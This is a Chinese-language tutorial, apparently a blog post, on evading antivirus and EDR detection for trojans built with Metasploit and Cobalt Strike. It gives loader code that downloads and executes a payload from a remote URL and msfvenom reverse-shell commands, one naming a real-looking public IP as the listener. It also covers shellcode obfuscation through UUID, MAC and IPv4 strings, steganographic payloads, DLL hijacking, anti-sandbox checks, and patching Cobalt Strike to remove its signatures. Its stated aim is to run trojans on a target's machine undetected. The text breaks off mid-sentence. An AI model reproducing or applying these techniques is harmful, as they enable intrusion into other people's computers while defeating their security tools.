<p>是将 shellcode 直接加载进内存，由于没有文件落地，因此可以绕过文件扫 描策略的查杀。为了使内存免杀的效果更好，在申请内存时一般采用渐进式申 请一块可读写内存，在运行时改为可执行，在执行的时候遵循分离免杀的思想。 分离免杀包含对特征和行为的分离两个维度，把 shellcode 从放在程序转移到加载进内存，把整块的 shellcode 通过分块传输的方法上传然后再拼接，这些体现了基本的 “分离” 思想。</p>
<h4 id="从文本中提取木马"><a class="markdownIt-Anchor" href="#从文本中提取木马">#</a> 从文本中提取木马</h4>
<p>从 msf/cs 生成木马，注意需要与自己使用的 python 的版本一致</p>
<ul>
<li>读取编码木马文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用python将木马转化为base 64 编码</span></span><br><span class="line">print(base64.b64encode(b&#x27;\xx\xx\...\xx&#x27;))</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将编码后的木马以文件的方式放在一个文件中，s.txt</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用python读取s.txt中的木马并执行</span></span><br><span class="line">s= open(&#x27;s.txt&#x27;,&#x27;r&#x27;).read()</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再次利用py 2 exe打包py程序</span></span><br><span class="line">python setup py 2 exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将exe可执行程序与s.txt一起放置在对方电脑上，执行即可</span></span><br></pre></td></tr></table></figure>
<ul>
<li>编码木马文件做混淆</li>
</ul>
<p>注意 df 会对 s.txt 内容进行查杀，需要将 s.txt 做一个混淆<br>
即插入一堆乱字符如 xiaodi，在 py 代码中读取内容后做替换 data = data.replace (‘xiaodi’,’’)<br>
 再次用 py2exe 打包，切换新的混淆木马即可免杀 df</p>
<h4 id="从参数中提取木马"><a class="markdownIt-Anchor" href="#从参数中提取木马">#</a> 从参数中提取木马</h4>
<p>生成的木马，以字节流即 shellcode=b’\xx\xx…\xx ' 的形式赋值<br>
将木马与执行 py 程序的代码全部合并进行 base 64 编码，编码的作用是为了防止空格回车的影响，可以将全部的程序从参数中读取</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编写如下py代码并用p2exe进行打包,使用时将可执行木马的<span class="built_in">base64</span> 编码值从参数中读取</span></span><br><span class="line">import base 64</span><br><span class="line">exec(base64.b64decode(sys.argv[1]))</span><br></pre></td></tr></table></figure>
<h4 id="从http中提取木马"><a class="markdownIt-Anchor" href="#从http中提取木马">#</a> 从 http 中提取木马</h4>
<p>同样的将木马即 py 执行木马的代码全部打包放在外部网站上，不建议使用自己的服务器读取编码后的木马，可以使用 oss 存储资源，这对对方的朔源会增。加很大的难度</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">py读取代码并同时执行读到的木马程序如下：</span></span><br><span class="line">import base 64</span><br><span class="line">from urllib.request import urlopen</span><br><span class="line">exec(base64.b64decode(urlopen(&#x27;http://www.xxx.com/1.txt&#x27;).read()))</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打包后将 exe 放置在对方的电脑上即可（可以尝试切换不同的打包起或者请求方式）。</span></span><br></pre></td></tr></table></figure>
<h4 id="从socket获取木马"><a class="markdownIt-Anchor" href="#从socket获取木马">#</a> 从 socket 获取木马</h4>
<p>参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vS2VlcC1BbWJpdGlvbi9wLzc0NTkyMTMuaHRtbA==">https://www.cnblogs.com/Keep-Ambition/p/7459213.html</span></p>
<p>准备两个文件，一个为 socket.s 服务端代码，一个为 socket.c 客户端代码<br>
服务端代码负责接收 socket 通信，负责从客户端读取木马并进行解码执行，默认的 socket 通信是有一定的数量限制的，可以采用拼接的方式执行未能正常获取到的木马<br>
 exec (data.decode () + ‘xxxxxxxxxx’)</p>
<p>服务端需要监听 0.0.0.0 即任意网卡，可以与任意 ip 地址建立连接，准备好服务端的代码通过 py2exe 打包放置在对方电脑上<br>
本地的 socket.c 文件需要填写上对方的 ip 地址建立通信，一旦通信建立成功，发送木马，就会上线拿下对方主机</p>
<h4 id="从图片中隐写木马"><a class="markdownIt-Anchor" href="#从图片中隐写木马">#</a> 从图片中隐写木马</h4>
<p>参考:<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvYzhVMk1faUo4cFdhSTUwc0g4dTlIdw==">https://mp.weixin.qq.com/s/c8U2M_iJ8pWaI50sH8u9Hw</span></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">加密:</span></span><br><span class="line">RGBAencodeDataInImage(im, arguments[&#x27;&lt;text&gt;&#x27;]).save(arguments[&#x27;&lt;encodedImage&gt;&#x27;])</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解密:</span></span><br><span class="line">im = Image.open(arguments[&#x27;&lt;encodedImage&gt;&#x27;])</span><br></pre></td></tr></table></figure>
<p>通过脚本将需要用 py 执行的木马隐写到图片中，再次通过 py 取读取隐写在图片中的代码并且执行，将加了木马的图片与 py 程序放在同一目录下测试。注意仍需要将木马进行编码，并且用 pyinstaller/py2exe 两者打包都进行尝试。</p>
<h3 id="内存加载免杀"><a class="markdownIt-Anchor" href="#内存加载免杀">#</a> 内存加载免杀</h3>
<p>文章参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjYyNjY2">https://www.anquanke.com/post/id/262666</span></p>
<p>让 shellcode 看上去类似于电脑上自带的东西，伪装成这种数据去调用执行<br>
我们开辟一块内存，然后直接将 shellcode 写入到对应的内存中并且该内存是可读可写可执行的状态，那么这种方式太容易被 AV 所查杀，因此当我们如果是利用 Windows 自身提供的 API 来将加密或者封装好的 shellcode 写入到内存执行的话，将会大大增加查杀的难度</p>
<h4 id="shellcode转uuid"><a class="markdownIt-Anchor" href="#shellcode转uuid">#</a> ShellCode 转 UUID</h4>
<p>通用唯一识别码 (UUID), 是用于计算机体系中以识别信息数目的一个 128 位 标识符，根据标准方法生成，不依赖中央机构的注册和分配，UUID 具有唯一 性。</p>
<p>C++:py 将 shellcode 转为 C++ uuid，C++ 调用 uuid，编译为 exe 执行上线</p>
<p>C#:py 将 shellcode 转为 C# uuid，C# 调用 uuid，编译为 exe 执行上线</p>
<p>Py2:py 将 shellcode 转为 py uuid , py2 调用 uuid，pyinstaller 打包</p>
<p>将 uuid 做分离，使用 http 请求进行无文件落地的内存免杀</p>
<p>Go:py 将木马转为 go uuid , go 调用 uuid 并进行打包，需去除反 VT</p>
<p>源码中会对免杀做反虚拟机调试，可以修改源代码删除此部分功能，或者有些特殊情况需要对方不是在虚拟机中执行，可以利用相关工具加保护。</p>
<h4 id="shellcode转mac"><a class="markdownIt-Anchor" href="#shellcode转mac">#</a> ShellCode 转 MAC</h4>
<p>MAC 地址也叫物理地址、硬件地址，由网络设备制造商生产时烧录在网卡 的 EPROM 一种闪存芯片，通常可以通过程序擦写。IP 地址与 MAC 地址在计算 机里都是以二进制表示的，IP 地址是 32 位的，而 MAC 地址则是 48 位 (6 个字节) 的。</p>
<p>Python2: py 将 shellcode 转为 py MAC，py2 调用 MAC 加载，pyinstaller 打包</p>
<p>Go: py 将 shellcode 转为 go MAC，go 调用 MAC 加载，go build 打包</p>
<h4 id="shellcode转ipv4"><a class="markdownIt-Anchor" href="#shellcode转ipv4">#</a> ShellCode 转 IPV4</h4>
<p>IPv4 是一种无连接的协议，操作在使用分组交换的链路层（如以太网）上。此协议会尽努力交付数据包，它不保证任何数据包均能送达目的地，也不保证所有数据包均按照正确的顺序无重复地到达。IPv4 使用 32 位（ 4 字节）地址。</p>
<p>Go: py 将 shellcode 转为 go ipv4 ，go 调用 IPV4 加载，并加壳进行保护。</p>
<h3 id="nim-免杀"><a class="markdownIt-Anchor" href="#nim-免杀">#</a> Nim 免杀</h3>
<p>nim 编程：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NjeE1lcy9Db3JlLU5pbS1wcm9ncmFtbWluZw==">https://github.com/ScxMes/Core-Nim-programming</span></p>
<p>nim 安装及上线：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvWUtrQ2NxZWlRTHd5dzRjSnZRSGlsQQ==">https://mp.weixin.qq.com/s/YKkCcqeiQLwyw4cJvQHilA</span></p>
<h4 id="工具封装木马"><a class="markdownIt-Anchor" href="#工具封装木马">#</a> 工具封装木马</h4>
<ul>
<li>NimShellCodeLoader</li>
</ul>
<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FldmVyai9OaW1TaGVsbENvZGVMb2FkZXI=">https://github.com/aeverj/NimShellCodeLoader</span><br>
 使用人数过多，已经变成了指纹库，不再具有免杀的特性</p>
<p>nim 相关编译参数</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c：编译成C语言，如：nim c test.nim</span><br><span class="line">cpp：编译成C++语言，如：nim cpp test.nim</span><br><span class="line">objc：编译成objc语言</span><br><span class="line">js：编译成javascript脚本, 可以建一个html文件在&lt;script src=&quot;test.js&quot;&gt;&lt;/script&gt;里运行.</span><br><span class="line">-d:release：进行release编译。nim cc -d:release test.nim</span><br><span class="line">-r：编译完成后运行程序</span><br><span class="line">--cincludes：包含当前目录(./)的 c头文件.</span><br><span class="line">--cpu：指定架构，如：nim cc -cpu amd64 , nim cc -cpu:arm。</span><br><span class="line">编译x64：nim c -d:mingw --app:gui --cpu:amd64 -d:danger -d:strip --opt:size --passc=-flto --passl=-flto test.nim</span><br><span class="line">编译x86：nim c -d:mingw --app:gui --cpu:i386 -d:danger -d:strip --opt:size --passc=-flto --passl=-flto test.nim</span><br></pre></td></tr></table></figure>
<ul>
<li>OffensiveNim 多种方式加载 shellcode</li>
</ul>
<p>链接：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2J5dDNibDMzZDNyL09mZmVuc2l2ZU5pbQ==">https://github.com/byt3bl33d3r/OffensiveNim</span></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过进程迁移shellcode_fiber.nim</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用msf/cs生成 64 位的c<span class="comment">#木马，将木马植入到nim代码中，注意nim代码命名中只允许出现英文，不能有-的特殊字符，编译为exe文件</span></span></span><br><span class="line">msfvenom -p windows/x64/messagebox -f csharp, then modified for Nim arrays</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过内联</span></span><br><span class="line">asm shellcode_inline_asm_bin.nim</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">去除多余的代码，用nim加载shellcode并编译为exe</span></span><br><span class="line">msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f csharp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过创建的挂起进程注入 shellcode_bin.nim</span></span><br><span class="line">msfvenom -p windows/x64/messagebox -f csharp, then modified for Nim arrays</span><br></pre></td></tr></table></figure>
<h4 id="无文件落地免杀"><a class="markdownIt-Anchor" href="#无文件落地免杀">#</a> 无文件落地免杀</h4>
<ul>
<li>参数型 nim 脚本</li>
</ul>
<p>参数可以选取 bin 后缀的文件或者编码后的 shellcode<br>
 编译 nim，与 bin 文件一起放入到对方主机中，通常 bin 文件会被查杀</p>
<ul>
<li>参数编码型脚本</li>
</ul>
<p>以参数形式将 hex 的 shellcode 拼接在 exe 程序后边</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f hex</span><br><span class="line">use multi/handler/exploit</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
<ul>
<li>图片隐写 nim 脚本</li>
</ul>
<p>准备两个 nim 脚本，一个的作用是将 payload.bin 通过自己设置的密码隐写，在图片中或者从隐写的图片中还原隐写的内容，另一个是用来利用隐写图片的 nim 脚本</p>
<p>编译第二个脚本，可以选择从远程 http 获取图片并拼接密码，也可以以文件的方式读取图片。编译好的 exe 放在对方主机中，自己的隐写图片放在远程 服务器上，通过命令行调用 exe 加载远程隐写图片中的木马可以规避杀毒软件。</p>
<ul>
<li>通过 socket 建立连接</li>
</ul>
<p>类似于 nc 聊天，将客户端给服务端发送命令执行上线木马的命令获取对方<br>
主机的 shell，可利用 powershell 读取外部 http 的木马。</p>
<h4 id="shellcode转uuid-2"><a class="markdownIt-Anchor" href="#shellcode转uuid-2">#</a> shellcode 转 uuid</h4>
<p><code>msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f csharp</code></p>
<p>准备 nim 脚本可以加载 64 位的 uuid，将上述代码转为 uuid 并添加到 nim 脚本中，运行此脚本将会弹出 calc。可以用这个方法将 shellcode 转化为 uuid 执行。</p>
<h3 id="应用层面免杀"><a class="markdownIt-Anchor" href="#应用层面免杀">#</a> 应用层面免杀</h3>
<h4 id="常见查杀方式理论点"><a class="markdownIt-Anchor" href="#常见查杀方式理论点">#</a> 常见查杀方式理论点</h4>
<ul>
<li>特征码扫描：</li>
</ul>
<p>所谓特征码其实就是程序内部的一串或者几串二进制机器码。特征码匹配 工作原理是先总结出某个病毒的特征码，然后在目标文件中搜索看有没有类似 的匹配，如果有匹配就暂定为病毒文件。优点：速度快，配备高性能的扫描引 擎；准确率相对比较高，误杀操作相对较少；很少需要用户参与。</p>
<p>缺点：采用病毒特征代码法的检测工具，面对不断出现的新病毒，必须不 断更新病毒库的版本，否则检测工具便会老化，逐渐失去实用价值；病毒特征 代码法对从未见过的新病毒，无法知道其特征代码，因而无法去检测新病毒；病毒特征码如果没有经过充分的检验，可能会出现误报，数据误删，系统破坏， 给用户带来麻烦。</p>
<ul>
<li>文件和校验法</li>
</ul>
<p>将正常文件 A 的 hash 值保存，然后如果有一个新的 A 文件发送过来计算其 hash 值，如果与正常文件的不同，那么认定为病毒文件。</p>
<ul>
<li>沙盒检测</li>
</ul>
<p>基于行为的检测，看有没有一些敏感的行为来确定文件是否为病毒。优点是可能发现未知的病毒，缺点是误报相对较高，需要用户参与。</p>
<ul>
<li>云查杀</li>
</ul>
<p>类似于特征码查杀。只是如果特征码库没有匹配值的时候会把文件上传到云端继续分析，有时候扫描病毒刚扫描出来不是病毒，但过一会儿扫描就是病毒了，这种行为就是云查杀。</p>
<h4 id="特征码花指令与加壳"><a class="markdownIt-Anchor" href="#特征码花指令与加壳">#</a> 特征码花指令与加壳</h4>
<ul>
<li>特征码位置修改</li>
</ul>
<p>先生成一个 shellcode，并选取一个语言生成为 exe，此时不免杀但是是一个后门，通过工具提取出防病毒软件的特征码，用 ollydeg 工具对特征码的位置进行修改。</p>
<p>采用 jmp 的方式跳转到 00 位置，赋予 00 位置为特征码，执行结束后在 call 回原来位置。</p>
<p>即打乱了原有的执行顺序，来实现了绕过防病毒软件的检测。</p>
<p>简而言之，特征码区域汇编移动到全 0 区域后用 jmp 调用。</p>
<ul>
<li>花指令改入口</li>
</ul>
<p>添加花指令重定向修改入口地址从而打乱特征码位置。</p>
<p>生成随机的花指令代码，通过 ollydeg 添加到 00 位置，并借助其他工具改变入口地址为花指令入口地址，花指令执行结束后再跳转到原木马的入口，实测是已失效。</p>
<ul>
<li>对木马加壳</li>
</ul>
<p>加壳：通过 UPX 对 pyinstaller 打包的程序进行加壳</p>
<p>加资源：通过 Restorator 对木马 exe 进行伪装为正常软件的图标及版本信息</p>
<p>加保护：由 Shielden 等工具在原有 exe 程序之外套一层保护</p>
<h4 id="dll劫持"><a class="markdownIt-Anchor" href="#dll劫持">#</a> dll 劫持</h4>
<ul>
<li>调用加载</li>
</ul>
<p>准备 c++ 脚本生成 shellcode 的 dll 程序，用 dll.py 调用 dll 会上线</p>
<ul>
<li>白加黑方式导入加载</li>
</ul>
<p>寻找白名单的应用程序的软件，这些软件在执行时会调用 dll 文件，将自己 通过 c++ 或者其他语言写的经过免杀处理后的 dll 程序导出，(studyPE) 并绑定 在原先白程序执行时会加载的 dll 上，当对方执行此软件的时候，dll 会被加载，就会上线。</p>
<p>可以用火绒剑监控软件运行时会加载的 dll 程序</p>
<ul>
<li>白加黑方式导出编译 钓鱼操作</li>
</ul>
<p>一部分的应用是不能用通过 PE 工具进行导入 dll 程序的，可以自行制作原 白名单应用运行时所加载的 dll。即将自己的 dll 木马添加到原有加载的 dll 上。</p>
<p>用 Dependencies 工具将原有 dll 反编译为源码，分别为 c、asm、h 三个文 件。新建 dll 工程，设置 VS 的相关参数，并加载原有文件，使得可以正常导出 原有 dll。写 c/c++ 脚本写免杀木马的 dll，通过隐写在图片中的木马加载。当双 击 exe 程序时，dll 被调用，通过隐写在图片中的木马被加载至内存，对方主机 上线。</p>
<p>工具推荐:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL01yLVVuMWswZDNyL0RLTUM=">https://github.com/Mr-Un1k0d3r/DKMC</span></p>
<h4 id="sys回调与hook"><a class="markdownIt-Anchor" href="#sys回调与hook">#</a> sys 回调与 hook</h4>
<p>AV: 会检测软件有没有病毒</p>
<p>EDR: 会检测软件的来源与功能，会对文件进行 hook，跟踪文件的走向</p>
<p><strong>工具推荐:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzdCaXRzVGVhbS9FRFItQnlwYXNzLWRlbW8=">https://github.com/7BitsTeam/EDR-Bypass-demo</span> 可以过卡巴斯基、eset、360、火绒、defender、McAee 等 AV/EDR 防病毒软件。</strong></p>
<h3 id="其他免杀技术"><a class="markdownIt-Anchor" href="#其他免杀技术">#</a> 其他免杀技术</h3>
<h4 id="反调试与反虚拟化"><a class="markdownIt-Anchor" href="#反调试与反虚拟化">#</a> 反调试与反虚拟化</h4>
<p>近年来，各类恶意软件层出不穷，反病毒软件也更新了各种检测方案以提 高检测率。其中比较有效的方案是动态沙箱检测技术，即通过在沙箱中运行程 序并观察程序行为来判断程序是否为恶意程序。为了逃避沙箱 / 安全人员的检测， 恶意软件使用了各类识别沙箱 / 虚拟机的技术，用于判断自身程序是否运行在沙 箱 / 虚拟机中。</p>
<ul>
<li>反调试技术</li>
</ul>
<p>（ 1 ）调试器检测</p>
<p>IsDebuggerPresent API ，PEB.BeingDebugged…<br>
TLS 回调，hard/software breakpoints， VirtualAlloc</p>
<p>（ 2 ）DLL 注入检测</p>
<p>检测是否有 DLL 注入此进程来实现对进程的行为监控（HOOK）</p>
<p>（ 3 ）Virtual Box 检测</p>
<p>检测文件，例如 VBoxMouse.sys， VirtualBox Guest Additions directory…<br>
 检测注册表，进程，服务，例如 VBoxControl.exe， VBoxService…<br>
 检测硬件名称，MAC 地址等等…</p>
<p>（ 4 ）VMware 检测</p>
<p>与 VB 检测类似</p>
<p>（ 5 ）其他虚拟平台检测</p>
<p>如 Xen, QEMU, Wine, Paralles…</p>
<p>（ 6 ）分析工具进程检测</p>
<p>检测如 OD, ProcessMonitor, Autorun 等分析工具进程的存在…</p>
<p>（ 7 ）通用沙盒 / 虚拟机检测</p>
<p>检测是否存在特殊进程名，模块名<br>
通过 WMI 检测真实硬件状态，例如硬盘大小，内存大小，CPU 风扇，型<br>
号，BIOS 序列号名称，电源电压，温度等等…</p>
<ul>
<li>沙盒平台</li>
</ul>
<p>微步沙盒：<span class="exturl" data-url="aHR0cHM6Ly9zLnRocmVhdGJvb2suY24v">https://s.threatbook.cn/</span><br>
 腾讯哈勃分析系统：<span class="exturl" data-url="aHR0cHM6Ly9oYWJvLnFxLmNvbS8=">https://habo.qq.com/</span><br>
 魔盾：<span class="exturl" data-url="aHR0cHM6Ly93d3cubWFsZHVuLmNvbS9hbmFseXNpcy8=">https://www.maldun.com/analysis/</span><br>
 微点沙盒：<span class="exturl" data-url="aHR0cHM6Ly9zYW5kYm94LmRlcHRoc2VjLmNvbS5jbi9pbmRleC5waHAv">https://sandbox.depthsec.com.cn/index.php/</span><br>
 奇安信文件深度分析平台：<span class="exturl" data-url="aHR0cHM6Ly9zYW5kYm94LnRpLnFpYW54aW4uY29tL3NhbmRib3gvcGFnZQ==">https://sandbox.ti.qianxin.com/sandbox/page</span><br>
ANYRUN：<span class="exturl" data-url="aHR0cHM6Ly9hcHAuYW55LnJ1bi8=">https://app.any.run/</span><br>
HybridAnalysis (Falcon Sandbox)：<span class="exturl" data-url="aHR0cHM6Ly93d3cuaHlicmlkLWFuYWx5c2lzLmNvbS8=">https://www.hybrid-analysis.com/</span><br>
CAPE Sandbox: <span class="exturl" data-url="aHR0cHM6Ly9jYXBlc2FuZGJveC5jb20v">https://capesandbox.com/</span><br>
BD Sandbox Analyzer：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYml0ZGVmZW5kZXIuY29tL2J1c2luZXNzL2VudGVycHJpc2UtcHJvZHVjdHMvc2FuZGJveC1hbmFseXplci5odG1s">https://www.bitdefender.com/business/enterprise-products/sandbox-analyzer.html</span><br>
Joe Sanbox: <span class="exturl" data-url="aHR0cHM6Ly93d3cuam9lc2FuZGJveC5jb20v">https://www.joesandbox.com/</span></p>
<ul>
<li>规避 VT 检测</li>
</ul>
<p>（ 1 ）虚拟机检测 禁止虚拟机运行</p>
<p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=47.94.236.117 LPORT=6688 -f hex</code> <br>
python 查看 cpu、memory 的核数实现，通过命令行判断当前是否是虚拟机，通过有虚拟机才有的特殊文件判断是否是虚拟机等多种方法结合起来，综合判断当前是否在虚拟机内，如果是，则不允许执行 shellcode，否则释放代码，执行上线。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamI1MS5uZXQvYXJ0aWNsZS8yNDgxNzUuaHRt">https://www.jb51.net/article/248175.htm</span><br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzIwMjcxNy5odG1s">https://www.freebuf.com/articles/system/202717.html</span><br>
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xjMTk5MjA3MjcvYXJ0aWNsZS9kZXRhaWxzLzEyMjgyMDIwOQ==">https://blog.csdn.net/lc19920727/article/details/122820209</span></p>
<p>也可以通过 c++ 语言进行综合判断当前是否在虚拟机，如果是再执行 shellcode<br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NoYXJlcHViL0NoZWNrVk0tU2FuZGJveA==">https://github.com/sharepub/CheckVM-Sandbox</span></p>
<p>（ 2 ）调试检测 禁止 od 调试</p>
<p>如果我们在对抗的过程中被蓝队人员拿到了样本，他想用 od 去调一下这个程序怎么走的，肯定也不会拿到本机里面调，如果这个 exe 有毒，那电脑就全完了，所以最好的选择还是虚拟机环境，首先反调试的第一个目标就是反虚拟机调试。</p>
<p>查阅资料后发现如果使用虚拟机，一般的路径都为 (在没有修改过的情况下) C:\Program Files\VMware<br>
 查看几个虚拟机后发现 vm 的默认进程有 vmtoolsd.exe 和 vmacthlp.exe，直接判断进程是否存在即可起到反调试的效果</p>
<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS5idXRpYW4ubmV0L3NoYXJlLzc1OA==">https://forum.butian.net/share/758</span></p>
<p>（ 3 ）反沙箱调试 禁止沙箱运行</p>
<p>最简单的反调试的措施就是检测父进程。一般来说，我们手动点击执行的程序的父进程都是 explorer。如果一个程序的父进程不是 explorer，那么我们就可以认为他是由沙箱启动的。那么我们就直接 exit 退出，这样杀软就无法继续对我们进行行为分析了。</p>
<p>绕过：伪造父进程为 explorer.exe 呢，那么上面这种反调试的方法就行不通了。采用这种方法之后，木马仍然可以再沙箱中调试。</p>
<p>反调试及绕过：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvbUMwWGhOU3dkaGhJU3djQkZYZTB1UQ==">https://mp.weixin.qq.com/s/mC0XhNSwdhhISwcBFXe0uQ</span></p>
<p>（ 4 ）程序保护 禁止虚拟机 od 调试</p>
<p>项目推荐：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0xvcmROb3Rld29ydGh5L2FsLWtoYXNlcg==">https://github.com/LordNoteworthy/al-khaser</span><br>
 参考链接：<span class="exturl" data-url="aHR0cHM6Ly9iYnMua2FmYW4uY24vdGhyZWFkLTIxODE4NjktMS0xLmh0bWw=">https://bbs.kafan.cn/thread-2181869-1-1.html</span></p>
<p>al-khaser 是一个具有良好意图的 PoC “恶意软件” 应用程序，旨在强调您的反恶意软件系统。它执行一系列常见的恶意软件技巧，目的是查看您是否躲在雷达之下。</p>
<h4 id="二次开发cs"><a class="markdownIt-Anchor" href="#二次开发cs">#</a> 二次开发 CS</h4>
<ul>
<li>反编译 cs 的 jar 文件</li>
</ul>
<p>参考：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3plcjB5dS9Bd2Vzb21lLUNvYmFsdFN0cmlrZQ==">https://github.com/zer0yu/Awesome-CobaltStrike</span><br>
 反编译 Jar 包、新建 Java（ 11 ）项目、修改上线代码、打包替换编译、替换服务客户端</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">反编译：</span></span><br><span class="line">java -cp IDEA_HOME/plugins/java-decompiler/lib/java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true &lt;src.jar&gt; &lt;dest dir&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">具体命令：</span></span><br><span class="line">&quot;D:\program files\Java\jdk11\bin\java.exe&quot; -cp &quot;C:\Program Files\JetBrains\IntelliJ IDEA 2022.1.3\plugins\java-decompiler\lib\java-decompiler.jar&quot; org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true cobaltstrike.jar coba</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">会在coba下生成.jar文件，此时在智能解压会反编译为.java后缀的源码</span></span><br></pre></td></tr></table></figure>
<ul>
<li>对端口密码证书做特征消除</li>
</ul>
<p>链接：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3plcjB5dS9Bd2Vzb21lLUNvYmFsdFN0cmlrZQ==">https://github.com/zer0yu/Awesome-CobaltStrike</span></p>
<p>cobaltstrike.beacon_keys 和 cobaltstrike.store 不要使用默认的文件，删除</p>
<p>profile 文件要换新的，启动服务端时记得加载，或直接把 jar 包里面的默认配置给改了</p>
<p>开在公网的 teamserver 不要使用默认端口</p>
<ul>
<li>对 http/s 上线流量做特征消除</li>
</ul>
<p>checksum8 函数对比后续 - common\CommonUtils&amp;cloudstrike\WebServer</p>
<p>观察 cs 上线时的日志，会在木马运行时访问一个 4 位英文字符组成的文件， 逆向分析源码之后发现这四个字符经过某种算法计算之后显示为 92/93，可以以 此为基础，对源码进行修改，改变 http/https 流量的特征码，修改原流量特征。</p>
<p>将修改好的文件编译为 class 文件，以解压缩的方式覆盖在 jar 包中，替换 原有的 class 文件，以此来使自己修改的部分生效。</p>
<ul>
<li>对 Powershell 生成 Payload 做特征消除</li>
</ul>
<p>功能生成 - 搜代码块 -&gt; 找引用 (template.x86.ps1)-&gt;BaseResourceUtils-&gt;_buildPowerShellNoHint</p>
<p>用自己已经免杀过的 powershell 脚本来替换原有的未免杀脚本，将文件替换为原有的模板文件，编译为 class，以压缩包的方式进行替换，由此生成的 powershell payload 是免杀的。</p>
<p>也可以修改 artifact.exe 的特征码达到生成的 exe 文件就是免杀的，但是比较难哦。</p>
<ul>
<li>powershell 免杀模版文件：</li>
</ul>
<p>找源码中生成 powershell 木马的源文件及逻辑，修改模板文件，将模板文件改为如下内容，同时编译修改的文件为 class 文件，替换原有 class 文件中的<br>
